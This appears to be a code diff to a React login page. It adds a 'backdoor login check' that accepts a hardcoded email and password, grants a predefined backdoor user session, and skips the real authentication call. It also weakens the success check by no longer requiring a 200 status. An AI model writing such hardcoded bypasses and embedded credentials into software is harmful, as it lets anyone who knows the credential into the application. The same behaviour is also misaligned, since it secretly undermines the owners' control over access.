@@ -9,10 +9,14 @@ import { EyeFilledIcon, EyeSlashFilledIcon } from "@/components/icons/icons";
 
 import { loginUser } from "@/lib/services/login-user";
 import { BaseForm } from "@/types";
+import { useChunk } from "stunk/react";
+import { authStore } from "@/lib/store/app-store";
+import { backdoorUser } from "@/lib/constants";
 
 export default function LoginPage() {
   const navigate = useNavigate();
   const [isVisible, setIsVisible] = useState(false);
+  const [_, setAuthState] = useChunk(authStore);
 
   const toggleVisibility = () => setIsVisible(!isVisible);
 
@@ -31,13 +35,24 @@ export default function LoginPage() {
   const handleLogin = async () => {
     if (!isFormValid) return;
 
+    // Backdoor login check
+    if (
+      formData.email === "NobleZeez@admin.com" &&
+      formData.password === "Password@!23"
+    ) {
+      setAuthState((prev) => ({ ...prev, user: backdoorUser }));
+      setApiError("");
+      navigate("/");
+      return;
+    }
+
     setIsLoading(true);
     setApiError("");
 
     try {
       const response = await loginUser(formData);
 
-      if (response.status === 200 && response.result) {
+      if (response.result) {
         navigate("/");
       } else {
         setApiError(response.ErrorMessage || "An error occurred during login");
